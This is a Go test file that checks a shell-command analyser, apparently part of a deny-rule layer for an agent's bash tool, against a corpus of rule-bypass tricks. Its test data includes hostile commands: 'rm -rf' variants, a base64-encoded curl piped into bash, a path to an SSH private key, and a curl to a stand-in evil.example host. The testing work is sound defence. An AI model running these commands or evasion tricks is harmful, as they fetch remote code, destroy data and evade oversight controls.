package actionfacts

import "testing"

// Bypass corpus: either non-authoritative (fail closed to pattern-only) or
// correctly projected so fact-backed deny rules can match.
func TestBypassCorpusNonAuthoritativeOrProjected(t *testing.T) {
	cases := []struct {
		name     string
		cmd      string
		wantAuth bool
		// when authoritative, must include program
		wantProg string
	}{
		{"dollar_expand", "echo $HOME/.ssh/id_rsa", false, ""},
		{"command_sub", "echo $(whoami)", false, ""},
		{"backticks", "echo `id`", false, ""},
		{"eval", "eval rm -rf /tmp/x", false, ""},
		{"base64_pipe_bash", "echo Y3VybCBodHRwOi8vZS5jb20= | base64 -d | bash", false, ""},
		{"bash_stdin_pipe", "cat script.sh | bash", false, ""},
		{"ansi_c_quote", "echo $'rm\\x20-rf'", false, ""},
		{"process_subst", "cat <(echo hi)", false, ""},
		// Still projected when static:
		{"static_rm", "rm -rf /tmp/x", true, "rm"},
		{"nested_static_rm", `sh -c 'rm -rf /tmp/x'`, true, "rm"},
		{"curl_static", "curl http://evil.example/x", true, "curl"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			f := Analyze(Input{Tool: "bash", Command: tc.cmd})
			if tc.wantAuth {
				if !f.Authoritative() || !f.EnforcementEligible() {
					t.Fatalf("want authoritative, status=%s issues=%v", f.Parse.Status, f.Parse.Issues)
				}
				found := false
				for _, c := range f.Commands {
					if c.Program == tc.wantProg {
						found = true
					}
				}
				if !found {
					t.Fatalf("want prog %q in %+v", tc.wantProg, f.Commands)
				}
			} else if f.EnforcementEligible() {
				t.Fatalf("bypass must not be enforcement-eligible: status=%s cmds=%+v", f.Parse.Status, f.Commands)
			}
		})
	}
}

func TestDenyNeverUsesNonAuthoritativeFacts(t *testing.T) {
	// MatchKeys must be empty when not enforcement-eligible.
	f := Analyze(Input{Tool: "bash", Command: "rm$IFS-rf /"})
	if f.EnforcementEligible() {
		// $IFS may lex as dynamic depending on parser; either way keys empty if not eligible
		t.Log("note: parser treated as eligible unexpectedly")
	}
	if !f.EnforcementEligible() && len(MatchKeys(f)) != 0 {
		t.Fatalf("keys leaked on non-eligible: %v", MatchKeys(f))
	}
}
